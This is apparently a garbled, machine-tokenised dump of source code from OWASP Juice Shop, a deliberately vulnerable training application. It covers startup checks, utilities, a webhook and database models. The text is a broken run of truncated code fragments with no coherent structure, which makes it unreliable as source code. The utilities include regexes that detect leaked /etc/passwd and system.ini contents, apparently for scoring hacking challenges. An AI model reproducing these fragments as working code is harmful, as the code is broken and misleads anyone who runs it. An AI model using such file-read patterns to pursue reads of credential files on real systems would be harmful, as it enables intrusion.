tring }path: string,logger. ... th))}`)`${path ... gth))}`colors. ... ength))message ... length)message.substrmessage ... .lengthmessage ... f(path)message.indexOfpath.lengthcheckMi ... cess\r\n}(produc ... cess\r\n}if (pro ... se\r\n  }products.length < 4`Only $ ... OK')})`Only  produc ... uired ( products are configured but at least four are required (checkUn ... cess\r\n}special ... }\r\n  })special ... forEach({ name ...  }\r\n  }{ name, key }const m ... t[key])matchin ... t[key])product ... t[key])products.filter(produc ... ct[key]product[key]if (mat ... \r\n    }matchin ... h === 0matchin ... .length`No pro ... OK')})`No prod ... red as No product is configured as colors.italic(name) but on ... uired ( but one is required (matchin ... gth > 1`${matc ... OK')})` produc ... red as  products are configured as  but on ... lowed ( but only one is allowed (checkNe ... cess\r\n}{ name, ...  = {} }extra = {}if (ext ... \r\n    }extra.k ... ra.key]extra.k ... h === 1extra.keymatchin ... h === 1!matchi ... ra.key]matchin ... ra.key]matchingProducts[0]`Produc ... OK')})`Product colors. ... ].name)matchin ... 0].name configured as  does't ... essary  does't contain necessary colors. ... name}`)`${extra.name}`extra.nameproduct ... }\r\n  })products.forEach(produc ...  }\r\n  }const a ... t[key])applied ... t[key])special ... t[key])special ... .filter({ key  ... ct[key]if (app ... \r\n    }applied ... gth > 1applied ... .lengthcolors. ... t.name) is used as applied ...  and ')applied ... `).joinapplied ... ame)}`)appliedSpecials.map({ name ... name)}``${colo ... name)}` but ca ... lenge ( but can only be used for one challenge ((memori ... cess\r\n}if (mem ... se\r\n  }memories.length < 2 memori ... uired ( memories are configured but at least two are required ({ name, keys }const m ... ys[1]])matchin ... ys[1]])memorie ... ys[1]])memories.filter(memory ... eys[1]]memory[ ... eys[1]]memory[keys[0]]memory[keys[1]]keys[1]`No mem ... OK')})`No memo ... red as No memory is configured as  memori ... red as  memories are configured as checkSp ... cess\r\n}{ name, user, keys }const m ... = user)matchin ... = user)memorie ... = user)(memory ... == usermemory[ ... == usermemory[ ... ry.usermemory.user !== usermatchin ... gth > 0`Memory ... OK')})`Memory  ... red as Memory configured as  must b ... o user  must belong to user colors.italic(user) but was linked to colors. ... known')matchin ... nknown'matchin ... 0].usermatchingMemories[0] user (memorie ... }\r\n  })memories.forEach(memory ...  }\r\n  }const a ... ys[1]])applied ... ys[1]])special ... ys[1]])({ keys ... eys[1]]{ keys }Memory colors. ... aption)checkFo ... cess\r\n}if (con ... se\r\n  }configu ... Enabledconfigu ... lsFirstconfigu ... llenges!config ... Enabledconfigu ... tructor`Restri ... OK')})`Restric ... abled (Restricted tutorial mode is enabled while Hacking Instructor is disabled (configu ... cationsconfiguration.ctf!config ... cations`CTF fl ... OK')})`CTF fla ... abled (CTF flags are enabled while challenge solved notifications are disabled (if (['n ... se\r\n  }['name' ... cations['name' ... ations)['name' ... ncludes['name' ... 'both']`CTF co ... OK')})`CTF cou ... abled (CTF country mappings for FBCTF are enabled while CTF flags are disabled (export  ... eConfigP:/My Drive/Git/juice-shop/lib/startup/validateDependencies.ts @ts-expect-error FIXME due to non-existing type definitions for check-dependencies// @ts- ... denciesdependencyChecker'check-dependencies'packageDirscopeList'dependencies'`Dependencies in ${'/package.json'} could not be checked due to "${}" error (${depsWereOk`All dependencies in ${} are satisfied (${} are not rightly satisfied (${'Exiting due to unsatisfied dependencies!'import  ... encies'check-dependenciesconst v ... \n  }\r\n}validat ... \n  }\r\n}{ packa ...  true }packageDir = '.'let dep ... ny = {}depende ... ny = {}try {\r\n ... `)\r\n  }depende ... es'] })await d ... es'] }){ packa ... ies'] }scopeLi ... ncies']['dependencies']catch ( ... `)\r\n  }`Depend ... OK')})`Dependencies in colors. ... .json')package ... e.json'/package.json could  ... ue to " could not be checked due to "" error (if (dep ...  }\r\n  }depende ... == truedepende ... sWereOk`All de ... OK')})`All dependencies in  are satisfied ( are no ... sfied ( are not rightly satisfied (dependencies.errorconst errlogger.warn(err)if (!su ... 1)\r\n  }!succes ... Failure!successlogger. ... ies!'))colors. ... cies!')'Exitin ... ncies!'Exiting due to unsatisfied dependencies!export  ... denciesP:/My Drive/Git/juice-shop/lib/startup/validateDependenciesBasic.ts note: this file can't have any other imports than the dynamic one below as it needs to be able to at least start up without the npm dependencies installed// note ... stalled otherwise this check would be useless as the app would fail on a random import before even reaching this point// othe ... s pointvalidateIfDependencyCheckerIsInstalled'Please run "npm install" before starting the application!'validat ... stalledtry {\r\n ... 1)\r\n  }await i ... ncies')import( ... ncies')catch ( ... 1)\r\n  }console ... tion!')'Please ... ation!'Please run "npm install" before starting the application!export  ... stalledP:/My Drive/Git/juice-shop/lib/startup/validatePreconditions.ts @ts-expect-error FIXME due to non-existing type definitions for check-internet-connected// @ts- ... nnected @ts-expect-error FIXME Type problem by accessing key via variable// @ts- ... ariable TODO Consider switching to "false" with breaking release v16.0.0 or later// TODO ... r laterpjson'../../package.json'semver'semver'portscanner'portscanner'checkInternetConnected'check-internet-connected'domainDependencies'https://www.alchemy.com/''"Mint the Honeypot" challenge''"Wallet Depletion" challenge'validatePreconditionscheckIfRunningOnSupportedNodeVersioncheckIfRunningOnSupportedOScheckIfRunningOnSupportedCPUasyncConditionscheckIfRequiredFileExists'build/server.js''frontend/dist/frontend/styles.css''frontend/dist/frontend/main.js''frontend/dist/frontend/polyfills.js''frontend/dist/frontend/runtime.js''frontend/dist/frontend/vendor.js'checkIfPortIsAvailablecheckIfDomainReachable'Exiting due to unsatisfied precondition!'runningVersionsupportedVersioneffectiveVersionRangevalidRange`Invalid Node.js version range ${} in package.json (${satisfies`Detected Node version ${} is not in the supported version range of ${`Detected Node.js version ${runningOSsupportedOS`Detected OS ${} is not in the list of supported platforms ${runningArchsupportedArch`Detected CPU ${} is not in the list of supported architectures ${`Domain ${} is reachable (${} is not reachable (${} in a future major release)`dependency} will not work as intended without access to ${portNumbercheckPortStatus`Port ${} is in use (${} is available (${pathRelativeToProjectRoot`Required file ${} is present (${} is missing (${import  ... e.json'../../package.json/packageimport  ... semver'import  ... canner'import  ... nected''check- ... nected'check-internet-connectedcheckIn ... nnectedconst d ... ge']\r\n}domainD ... ge']\r\n}{\r\n  'h ... ge']\r\n}'https: ... lenge']'https: ... y.com/'https://www.alchemy.com/alchemy['"Mint ... lenge']'"Mint  ... llenge'"Mint the Honeypot" challenge'"Walle ... llenge'"Wallet Depletion" challengevalidat ... ditions{ exitO ...  true }checkIf ... successcheckIf ... ersion)checkIf ... Versionprocess.versioncheckIf ... atform)checkIf ... ortedOScheckIf ... s.arch)checkIf ... rtedCPUprocess.archconst a ... dition)asyncCo ... dition)(await  ... dition)(await  ... ).every(await  ... \r\n  ]))await P ... )\r\n  ])Promise ... )\r\n  ])[\r\n     ... ')\r\n  ]checkIf ... er.js')checkIf ... eExistsbuild/server.jsbuild/servercheckIf ... .html')checkIf ... s.css')'fronte ... es.css'frontend/dist/frontend/styles.cssfrontend/dist/frontend/stylescheckIf ... in.js')'fronte ... ain.js'frontend/dist/frontend/main.jsfrontend/dist/frontend/maincheckIf ... ls.js')'fronte ... lls.js'frontend/dist/frontend/polyfills.jsfrontend/dist/frontend/polyfillscheckIf ... me.js')'fronte ... ime.js'frontend/dist/frontend/runtime.jsfrontend/dist/frontend/runtimecheckIf ... or.js')'fronte ... dor.js'frontend/dist/frontend/vendor.jsfrontend/dist/frontend/vendorcheckIf ... port'))checkIf ... ailablecheckIf ... .com/')checkIf ... achableconditi ... nditionif ((!s ... 1)\r\n  }(!succe ... Failure(!succe ... itions)!succes ... ditions!asyncConditionslogger. ... ion!'))colors. ... tion!')'Exitin ... ition!'Exiting due to unsatisfied precondition!const c ... true\r\n}checkIf ... true\r\n}(runnin ... true\r\n}{\r\n  co ... true\r\n}const s ... es.nodesupport ... es.nodepjson.engines.nodepjson.enginesconst e ... ersion)effecti ... ersion)effecti ... onRangesemver. ... ersion)semver.validRangeif (!ef ... se\r\n  }!effect ... onRange`Invali ... OK')})`Invalid ...  range Invalid Node.js version range colors. ... ersion) in package.json (if (!se ... se\r\n  }!semver ... nRange)semver. ... nRange)semver.satisfies`Detect ... OK')})`Detecte ... ersion Detected Node version  is not ... nge of  is not in the supported version range of Detected Node.js version const s ... json.ossupport ... json.ospjson.osif (!su ... se\r\n  }!suppor ... ningOS)support ... ningOS)supportedOS.includesDetected OS colors. ... ningOS) is not ... tforms  is not in the list of supported platforms support ... tring()supportedOS.toStringconst s ... son.cpusupport ... son.cpupjson.cpu!suppor ... ngArch)support ... ngArch)support ... ncludesDetected CPU colors. ... ngArch) is not ... ctures  is not in the list of supported architectures support ... oStringcheckIf ...   })\r\n}checkIn ... \n    })checkIn ...  .catchcheckIn ...   .thencheckIn ... main }){ domain }`Domain ... OK')})`Domain colors.bold(domain) is reachable (logger. ... ease)`)`Domain ... lease)` is not reachable (colors. ... OT OK') in a f ... elease) in a future major release)domainD ...      })domainD ... forEachdomainD ... domain](depend ...       }logger. ... ain)}`)`${colo ... main)}`colors. ... ndency) will n ... ess to  will not work as intended without access to number | stringconst p ... ring())portNum ... ring())parseIn ... ring())port.toString()port.toStringportsca ... \n    })portsca ... tStatusreject(error)if (sta ...       }status === 'open'`Port $ ... OK')})`Port  is in use (resolve(false) is available (resolve(true)pathRel ... ectRootconst f ... ') + 1)fileNam ... ') + 1)pathRel ... ') + 1)pathRel ... .substrpathRel ... /') + 1pathRel ... Of('/')pathRel ... IndexOfreturn  ... e\r\n  })await a ... e\r\n  })access( ... e\r\n  })access( ... )).thenaccess( ... tRoot))path.re ... ctRoot)() => { ... ue\r\n  }`Requir ... OK')})`Required file colors. ... leName) is present (() => { ... se\r\n  } is missing (export  ... ditionsP:/My Drive/Git/juice-shop/lib/utils.ts import isGitpod from 'is-gitpod') // FIXME Roll back to this when https://github.com/dword-design/is-gitpod/issues/94 is resolve// impo ... resolve TODO Inline all usages as this function is not adding any functionality to String.includes// TODO ... ncludes eslint-disable-line new-cap// esli ... new-cappackageJson'../package.json'jsSHA'jssha''download'clarinet'clarinet''data/types'isHeroku'./is-heroku''./is-docker''./is-windows'isGitpodmonths'JAN''FEB''MAR''APR''MAY''JUN''JUL''AUG''SEP''OCT''NOV''DEC''success'suffixcontainsEscaped/"/g'\\"'containsOrEscaped/(\r\n|\n|\r)/gmcachedCtfKeygetCtfKeyCTF_KEYshaObj'SHA-1''TEXT'setHMACKeygetHMAC'HEX''Failed to download 'authorization/^Bearer$/iChallengeEnablementStatusSafetyModeSettingisEnvironmentFunctionsafetyModeSetting'challenges.safetyMode'isEnvironmentFunctions'Heroku''Gitpod'parseJsonCustomjsonStringonkeyonopenobjectonvaluetoSimpleIpAddressipv6'::ffff:''::1''127.0.0.1'matchesSystemIniFile/; for 16-bit app support/gimatchesEtcPasswdFile/(\w*:\w*:\d*:\d*:\w*:.*)|(Note that this file is consulted directly)/gi../package.jsonimport  ... 'jssha'jsshaimport  ... wnload'import  ... arinet'data/typesimport  ... heroku'./is-heroku/is-herokuimport  ... docker'./is-docker/is-dockerimport  ... indows'./is-windows/is-windowsexport  ... docker'default as isDockerexport  ... indows'default as isWindowsconst i ... > falseisGitpo ... > falseconst m ...  'DEC']months  ...  'DEC']['JAN', ...  'DEC']const q ... \n  }\r\n}queryRe ... \n  }\r\n}<T>(\r\n  ... \n  }\r\n}{ data: ... tring }data: T,return  ... ta\r\n  }export  ... tp')\r\n}const i ... tp')\r\n}isUrl = ... tp')\r\n}(url: s ... tp')\r\n}{\r\n  re ... tp')\r\n}return  ... 'http')startsW ... 'http')const s ... : falsestartsW ... : false(str: s ... : falsestr ? s ... : falsestr.ind ... ) === 0str.indexOf(prefix)const e ... : falseendsWit ... : false(str?:  ... : false(str && ... : false(str && suffix)str && suffixstr.inc ... length)str.includesstr.len ... .lengthstr.lengthsuffix.lengthconst c ... : falsecontain ... : falsestr.inc ... lement)const c ... "'))\r\n}contain ... "'))\r\n}functio ... "'))\r\n}{\r\n  re ... "'))\r\n}return  ... '\\"'))contain ... '\\"'))element ...  '\\"')element.replace\"export  ... ent)\r\n}const c ... ent)\r\n}contain ... ent)\r\n}functio ... ent)\r\n}{\r\n  re ... ent)\r\n}return  ... lement)contain ... lement)const u ... \n  }\r\n}unquote ... \n  }\r\n}if (str ... tr\r\n  }str &&  ... r, '"')startsWith(str, '"')endsWith(str, '"')return  ... th - 1)str.sub ... th - 1)str.length - 1{\r\n     ... tr\r\n  }const t ...  str\r\n}trunc = ...  str\r\n}functio ...  str\r\n}{\r\n  st ...  str\r\n}str = s ... gm, '')str.rep ... gm, '')(\r\n|\n|\r)\r\n|\n|\r\r\nreturn  ... ' : str(str.le ... ' : str(str.le ... length)str.length > lengthstr.sub ... + '...'str.substrlength - 1version ... \n  }\r\n}(module ... \n  }\r\n}if (mod ... on\r\n  }return  ... module]package ... module]package ... denciesreturn  ... versionpackageJson.versionlet cac ... definedcachedC ... definedconst g ... fKey\r\n}getCtfK ... fKey\r\n}() => { ... fKey\r\n}{\r\n  if ... fKey\r\n}if (!ca ...  }\r\n  }!cachedCtfKeyprocess ... definedprocess.env.CTF_KEYcachedC ... CTF_KEYconst d ... 'utf8')data =  ... 'utf8')cachedCtfKey = datareturn cachedCtfKeyexport  ... EX')\r\n}const c ... EX')\r\n}ctfFlag ... EX')\r\n}(text:  ... EX')\r\n}{\r\n  co ... EX')\r\n}const s ... 'TEXT')shaObj  ... 'TEXT')new jsS ... 'TEXT')SHA-1TEXTshaObj. ... 'TEXT')shaObj.setHMACKeygetCtfKey()shaObj.update(text)shaObj.updatereturn  ... ('HEX')shaObj. ... ('HEX')shaObj.getHMACHEXexport  ... , 4)\r\n}const t ... , 4)\r\n}toMMMYY ... , 4)\r\n}(date:  ... , 4)\r\n}{\r\n  co ... , 4)\r\n}const m ... Month()month = ... Month()date.getMonth()date.getMonthconst y ... lYear()year =  ... lYear()date.getFullYear()date.getFullYearreturn  ... g(2, 4)months[ ... g(2, 4)months[month]year.to ... g(2, 4)year.to ... bstringyear.toString()year.toStringexport  ... '-')\r\n}const t ... '-')\r\n}toISO86 ... '-')\r\n}(date:  ... '-')\r\n}{\r\n  le ... '-')\r\n}let day ... tDate()day = ' ... tDate()'' + date.getDate()date.getDate()date.getDatelet mon ... () + 1)month = ... () + 1)'' + (d ... () + 1)(date.g ... () + 1)date.getMonth() + 1if (mon ... + monthmonth.length < 2month.lengthmonth = '0' + month'0' + monthif (day ... ' + dayday.length < 2day.lengthday = '0' + day'0' + dayreturn  ... in('-')[year,  ... in('-')[year,  ... y].join[year, month, day]export  ... file\r\n}const e ... file\r\n}extract ... file\r\n}(url: s ... file\r\n}let fil ... ) + 1))file =  ... ) + 1))url.sub ... ') + 1)url.substringurl.las ... /') + 1url.lastIndexOf('/')url.lastIndexOfif (con ... ))\r\n  }contains(file, '?')file =  ... f('?'))file.su ... f('?'))file.substringfile.indexOf('?')file.indexOfconst d ... \n  }\r\n}downloa ... \n  }\r\n}try {\r\n ... ')\r\n  }const d ... ad(url)data =  ... ad(url)await download(url)download(url)fs.writ ... , data)catch ( ... ')\r\n  }logger. ...  + ')')'Failed ... ) + ')''Failed ... ge(err)'Failed ...  + ' (''Failed ... ' + url'Failed ... nload 'Failed to download getErrorMessage(err)const j ... ined\r\n}jwtFrom ... ined\r\n}{ headers: any }headers: anyif (hea ...  }\r\n  }headers ... izationconst p ... it(' ')parts = ... it(' ')headers ... it(' ')headers ... n.splitif (par ... \r\n    }parts.length === 2const s ... arts[0]scheme = parts[0]const t ... arts[1]token = parts[1]if (/^B ...       }/^Beare ... scheme)/^Bearer$/i.test^Bearer$Bearerreturn tokenexport  ... gth)\r\n}const r ... gth)\r\n}randomH ... gth)\r\n}(length ... gth)\r\n}{\r\n  re ... gth)\r\n}return  ... length)crypto. ... length)crypto. ... ).slicecrypto. ... oStringcrypto. ... h / 2))Math.ce ... th / 2)length / 2export  ... null\r\n}Challen ... tStatusenabled: booleandisable ...  | nulltype Sa ...  'auto''enable ...  'auto'type is ... booleanisEnvir ... unction() => booleanexport  ... ll }\r\n}functio ... ll }\r\n}isEnvir ... nctionsconfig. ... yMode')'challe ... tyMode'challenges.safetyMode{ isDoc ... itpod }isDocke ... unctionisHerok ... unctionisWindo ... unctionisGitpo ... unction{\r\n  if ... ll }\r\n}if (!ch ...  }\r\n  }return  ...  null }{ enabl ...  null }disable ... e: nullif (saf ...  }\r\n  }safetyM ... sabled'challen ... ocker()challen ... ocker')isEnvir ... ocker()isEnvir ... sDockerreturn  ... cker' }{ enabl ... cker' }challen ... eroku()challen ... eroku')isEnvir ... eroku()isEnvir ... sHerokureturn  ... roku' }{ enabl ... roku' }disable ... Heroku'challen ... ndows()challen ... ndows')isEnvir ... ndows()isEnvir ... Windowsreturn  ... dows' }{ enabl ... dows' }challen ... itpod()challen ... itpod')isEnvir ... itpod()isEnvir ... sGitpodreturn  ... tpod' }{ enabl ... tpod' }disable ... Gitpod'challen ... nabled'safetyM ... nabled'return  ... Mode' }{ enabl ... Mode' }export  ... bled\r\n}functio ... bled\r\n}{\r\n  co ... bled\r\n}const { ... llenge){ enabl ... llenge){ enabled }getChal ... llenge)return enabledconst p ... sult\r\n}parseJs ... sult\r\n}(jsonSt ... sult\r\n}{\r\n  co ... sult\r\n}const p ... arser()parser  ... arser()clarinet.parser()clarinet.parserconst r ... [] = []result: any[] = []parser. ... })\r\n  }parser.onkeyparser.onopenobject(k: any ... })\r\n  }result. ... null }){ key:  ...  null }key: kparser. ...  v\r\n  }parser.onvalue(v: any ...  v\r\n  }{\r\n     ...  v\r\n  }result[ ... lue = vresult[ ... ].valueresult[ ... th - 1]result.length - 1parser. ... String)parser.writeparser.close()parser.closereturn resultconst t ... \n  }\r\n}toSimpl ... \n  }\r\n}(ipv6:  ... \n  }\r\n}if (sta ... v6\r\n  }startsW ... ffff:')::ffff:{\r\n     ... 7)\r\n  }return  ... bstr(7)ipv6.substr(7)ipv6.substrif (ipv ... v6\r\n  }ipv6 === '::1'::1{\r\n     ... 1'\r\n  }return '127.0.0.1'127.0.0.1127{\r\n     ... v6\r\n  }return ipv6export  ... ror)\r\n}const g ... ror)\r\n}getErro ... ror)\r\n}(error: ... ror)\r\n}{\r\n  if ... ror)\r\n}if (err ... messageerror i ... f Errorreturn error.messagereturn String(error)String(error)export  ... >= 1\r\n}const m ... >= 1\r\n}matches ... >= 1\r\n}(text:  ... >= 1\r\n}{\r\n  co ... >= 1\r\n}const m ... ort/gi)match = ... ort/gi)text.ma ... ort/gi)text.match/; for  ... port/gi; for 16-bit app supportreturn  ... th >= 1match ! ... th >= 1match !== nullmatch.length >= 1match.lengthconst m ... ly)/gi)match = ... ly)/gi)text.ma ... ly)/gi)/(\w*:\ ... tly)/gi(\w*:\w*:\d*:\d*:\w*:.*)|(Note that this file is consulted directly)(\w*:\w*:\d*:\d*:\w*:.*)\w*:\w*:\d*:\d*:\w*:.*\w*\d*(Note that this file is consulted directly)Note that this file is consulted directlyP:/My Drive/Git/juice-shop/lib/webhook.ts force type of post as promisify doesn't know which one it should take// forc ... ld takepromisify'util''request'CoreOptionsRequestCallbacksolutionissuedOn`Webhook ${} notified about ${} being solved: ${import os from 'os'import  ...  'util'import  ... equest'const p ... quest))post =  ... quest))promisi ... quest))request ... equest)request.post((uri:  ... equest)(uri: s ... Requestexport  ... )}`)\r\n}const n ... )}`)\r\n}notify  ... )}`)\r\n}async ( ... )}`)\r\n}{ key:  ... : any }name: any{\r\n  if ... )}`)\r\n}if (!we ... rn\r\n  }!webhook{\r\n    return\r\n  }const r ... }\r\n  })res = a ... }\r\n  })await p ... }\r\n  })post(we ... }\r\n  })json: { ... \r\n    }solutio ...       }totalCh ... Score()totalCheatScore()issuedO ... tring()ctfFlag ... e.name)issuer: ...       }hostNam ... tname()os.hostname()os: `${ ... se()})``${os.t ... se()})`os.type()os.release()appName ... .name')config: ... efault'version ... rsion()utils.version()logger. ... g())}`)`Webhoo ... ng())}`Webhook colors.bold(webhook) notified about  being solved: res.sta ... ring())res.statusCode < 400res.statusCoderes.sta ... tring()res.sta ... oStringP:/My Drive/Git/juice-shop/models/address.tsP:/My Drive/Git/juice-shop/modelsCreationOptionalInferAttributesInferCreationAttributesDataTypesSequelizeAddressModelInitINTEGERSTRINGisInt1000000tableName'Addresses'type Cr ... ptionaltype InferAttributestype In ... ributesInferCr ... ributestype Sequelizeclass A ... ring\r\n}Model<\r ... ess>\r\n>InferAt ... ddress>InferCr ... ddress>declare ...  numberdeclare ... number>Creatio ... number>declare ...  stringdeclare city: stringdeclare ...  | nullconstru ... rgs); }(...arg ... rgs); }{ super(...args); }super(...args);super(...args)...argsconst A ... \n  )\r\n}Address ... \n  )\r\n}(sequel ... \n  )\r\n}{\r\n  Ad ... \n  )\r\n}Address ...  }\r\n  )Address.initUserId: ...       }type: D ... INTEGERDataTypes.INTEGERid: {\r\n ...       }primaryKey: trueautoIncrement: truefullNam ...       }type: D ... .STRINGDataTypes.STRINGmobileN ...       }validat ...       }isInt: truemin: 1000000max: 9999999999zipCode ...       }len: [1, 8][1, 8]streetA ...       }len: [1, 160][1, 160]city: D ... .STRINGstate:  ... .STRINGcountry ... .STRINGtableNa ... resses'Addressesexport  ... lInit }Address ... ssModelP:/My Drive/Git/juice-shop/models/basket.tsNonAttribute'./product'BasketModelInit'Baskets'type NonAttribute./producttype ProductModelclass B ... l[]>\r\n}Model<\r ... ket>\r\n>InferAt ... Basket>InferCr ... Basket>Creatio ...  | nullCreatio ... string>declare ... odel[]>NonAttr ... odel[]>ProductModel[]const B ... \n  )\r\n}BasketM ... \n  )\r\n}{\r\n  Ba ... \n  )\r\n}Basket. ...  }\r\n  )Basket.initcoupon: ... .STRINGtableName: 'Baskets'BasketsBasket  ... etModelP:/My Drive/Git/juice-shop/models/basketitem.tsBasketItemModelInit'BasketItems'class B ... mber\r\n}Model<\r ... tem>\r\n>InferAt ... etItem>InferCr ... etItem>BasketI ... \n  )\r\n}BasketI ...  }\r\n  )BasketItem.initProduct ...       }BasketI ...       }quantit ... INTEGERtableNa ... tItems'BasketItemsBasketI ... emModelP:/My Drive/Git/juice-shop/models/captcha.tsCaptchaModelInit'Captchas'class C ... ring\r\n}Model<\r ... cha>\r\n>InferAt ... aptcha>InferCr ... aptcha>const C ... \n  )\r\n}Captcha ... \n  )\r\n}{\r\n  Ca ... \n  )\r\n}Captcha ...  }\r\n  )Captcha.initcaptcha ...       }captcha ... .STRINGanswer: ... .STRINGtableNa ... ptchas'CaptchasCaptcha ... haModelP:/My Drive/Git/juice-shop/models/card.tsCardModelInit9999999999999998'Cards'class C ... mber\r\n}Model<\r ... ard>\r\n>InferAt ... s<Card>InferCr ... s<Card>CardMod ... \n  )\r\n}Card.in ...  }\r\n  )Card.initfullNam ... .STRINGcardNum ...       }min: 10 ... 0000000max: 99 ... 9999998expMont ...       }min: 1max: 12expYear ...       }min: 2080max: 2099tableName: 'Cards'CardsCard as CardModelP:/My Drive/Git/juice-shop/models/challenge.tsChallengeModelInitBOOLEANNUMBER'Challenges'class C ... ber>\r\n}Model<\r ... nge>\r\n>InferAt ... llenge>InferCr ... llenge>declare name: stringdeclare key: stringdeclare ... defineddeclare ... oolean>Creatio ... oolean>Challen ... \n  )\r\n}{\r\n  Ch ... \n  )\r\n}Challen ...  }\r\n  )Challenge.initkey: Da ... .STRINGname: D ... .STRINGcategor ... .STRINGtags: D ... .STRINGdescrip ... .STRINGdifficu ... INTEGERhint: D ... .STRINGhintUrl ... .STRINGmitigat ... .STRINGsolved: ... BOOLEANDataTypes.BOOLEANdisable ... .STRINGtutoria ... .NUMBERDataTypes.NUMBERcodingC ... .NUMBERtableNa ... lenges'ChallengesChallen ... geModelP:/My Drive/Git/juice-shop/models/complaint.tsComplaintComplaintModelInit'Complaints'class C ... ing>\r\n}Model<\r ... int>\r\n>InferAt ... plaint>InferCr ... plaint>declare ... string>Complai ... \n  )\r\n}{\r\n  Co ... \n  )\r\n}Complai ...  }\r\n  )Complaint.initmessage ... .STRINGfile: D ... .STRINGtableNa ... laints'ComplaintsComplai ... ntModelP:/My Drive/Git/juice-shop/models/delivery.tsDeliveryModelInit'Deliveries'class D ... ring\r\n}Model<\r ... ery>\r\n>InferAt ... livery>InferCr ... livery>declare eta: numberdeclare icon: stringconst D ... \n  )\r\n}Deliver ... \n  )\r\n}{\r\n  De ... \n  )\r\n}Deliver ...  }\r\n  )Delivery.initprice:  ... s.FLOATDataTypes.FLOATdeluxeP ... s.FLOATeta: DataTypes.FLOATicon: D ... .STRINGtableNa ... veries'DeliveriesDeliver ... ryModelP:/My Drive/Git/juice-shop/models/feedback.ts'../lib/challengeUtils'FeedbackModelInitsanitizedCommentsetDataValueallowNull'Feedbacks''../lib ... eUtils'../lib/challengeUtils/lib/challengeUtilsclass F ... mber\r\n}Model<\r ... ack>\r\n>InferAt ... edback>InferCr ... edback>const F ... \n  )\r\n}Feedbac ... \n  )\r\n}{\r\n  Fe ... \n  )\r\n}Feedbac ...  }\r\n  )Feedback.initcomment ...       }set (co ...       }let san ...  stringsanitiz ...  stringutils.i ... llenge)utils.i ... Enabledsanitiz ... omment)securit ... omment)securit ... izeHtmlutils.c ...       )securit ... eSecurethis.se ... omment)this.setDataValuerating: ...       }allowNull: falseset (ra ...       }this.se ... rating)return rating === 0rating === 0tableNa ... dbacks'FeedbacksFeedbac ... ckModelP:/My Drive/Git/juice-shop/models/imageCaptcha.tsImageCaptchaImageCaptchaModelInitDATE'ImageCaptchas'ImageCaptchaModelclass I ... ate>\r\n}declare ... l<Date>Creatio ... l<Date>const I ... \n  )\r\n}ImageCa ... \n  )\r\n}ImageCa ... delInit{\r\n  Im ... \n  )\r\n}ImageCa ...  }\r\n  )ImageCaptcha.initimage:  ... .STRINGUserId: ... TEGER }{ type: ... TEGER }created ... es.DATEDataTypes.DATEImageCaptchasImageCa ... haModelP:/My Drive/Git/juice-shop/models/index.ts'./address''./basket''./basketitem''./captcha''./card''./challenge''./complaint''./delivery''./feedback''./imageCaptcha'MemoryModelInit'./memory'PrivacyRequestModelInit'./privacyRequests'ProductModelInitQuantityModelInit'./quantity'RecycleModelInit'./recycle'relationsInit'./relations'SecurityAnswerModelInit'./securityAnswer'SecurityQuestionModelInit'./securityQuestion'UserModelInit'./user'WalletModelInit'./wallet'Transaction'database''username'dialect'sqlite'retry/SQLITE_BUSY/transactionTypeTYPESIMMEDIATEstorage'data/juiceshop.sqlite'logging./address./basket./basketitem/basketitem./captchaimport  ... ./card'./card/card./challenge./complaint./delivery./feedback./imageCaptcha/imageCaptcha./memory/memoryimport  ... quests'./privacyRequests/privacyRequestsPrivacy ... delInit./quantity./recycle./relations/relations./securityAnswer/securityAnswerSecurit ... delInit./securityQuestion/securityQuestionimport  ... ./user'./user./walletconst s ... lse\r\n})sequeli ... lse\r\n})new Seq ... lse\r\n})database{\r\n  di ... alse\r\n}dialect: 'sqlite'sqliteretry:  ...  5\r\n  }{\r\n     ...  5\r\n  }match:  ... _BUSY/][/SQLITE_BUSY/]SQLITE_BUSYname: 'query'max: 5transac ... MEDIATETransac ... MEDIATETransaction.TYPESstorage ... sqlite''data/j ... sqlite'data/juiceshop.sqlitedata/juiceshoplogging: falseAddress ... uelize)BasketM ... uelize)BasketI ... uelize)Captcha ... uelize)CardMod ... uelize)Challen ... uelize)Complai ... uelize)Deliver ... uelize)Feedbac ... uelize)ImageCa ... uelize)MemoryM ... uelize)Privacy ... uelize)Product ... uelize)Quantit ... uelize)Recycle ... uelize)Securit ... uelize)UserMod ... uelize)WalletM ... uelize)relatio ... uelize)export { sequelize }P:/My Drive/Git/juice-shop/models/memory.ts'Memories'class M ... ring\r\n}Model<\r ... ory>\r\n>InferAt ... Memory>InferCr ... Memory>const M ... \n  )\r\n}MemoryM ... \n  )\r\n}{\r\n  Me ... \n  )\r\n}Memory. ...  }\r\n  )Memory.initcaption ... .STRINGimagePa ... .STRINGtableNa ... mories'MemoriesMemory  ... ryModelP:/My Drive/Git/juice-shop/models/privacyRequests.tsPrivacyRequestModeldeletionRequested'PrivacyRequests'class P ... lean\r\n}Model<\r ... del>\r\n>InferAt ... tModel>InferCr ... tModel>declare ... booleanconst P ... \n  )\r\n}Privacy ... \n  )\r\n}{\r\n  Pr ... \n  )\r\n}Privacy ...  }\r\n  )Privacy ... el.initdeletio ...       }type: D ... BOOLEANdefaultValue: falsetableNa ... quests'PrivacyRequestsP:/My Drive/Git/juice-shop/models/product.ts Note this is optional since it's only populated when explicitly requested in code// Note ... in code'description'DECIMAL'Products'paranoidtype BasketItemModelclass P ... code\r\n}Model<\r ... uct>\r\n>InferAt ... roduct>InferCr ... roduct>declare ... mModel>Creatio ... mModel>Product ... \n  )\r\n}Product ...  }\r\n  )Product.initdescrip ...       }set (de ...       }descrip ... iption)securit ... iption)this.se ... iption)price:  ... DECIMALDataTypes.DECIMALdeluxeP ... DECIMALtableNa ... oducts'paranoid: trueProduct ... ctModelP:/My Drive/Git/juice-shop/models/quantity.ts'Quantities'class Q ... null\r\n}Model<\r ... ity>\r\n>InferAt ... antity>InferCr ... antity>const Q ... \n  )\r\n}Quantit ... \n  )\r\n}{\r\n  Qu ... \n  )\r\n}Quantit ...  }\r\n  )Quantity.initquantit ...       }limitPe ...       }defaultValue: nulltableNa ... tities'QuantitiesQuantit ... tyModelP:/My Drive/Git/juice-shop/models/recycle.ts'Recycles'class R ... ring\r\n}Model<\r ... cle>\r\n>InferAt ... ecycle>InferCr ... ecycle>declare date: stringconst R ... \n  )\r\n}Recycle ... \n  )\r\n}{\r\n  Re ... \n  )\r\n}Recycle ...  }\r\n  )Recycle.initAddress ...       }isPicku ... false }{ type: ... false }date: DataTypes.DATEtableNa ... cycles'RecyclesRecycle ... leModelP:/My Drive/Git/juice-shop/models/relations.ts @ts-expect-error FIXME type mismatch// @ts- ... ismatch no FK constraint to allow 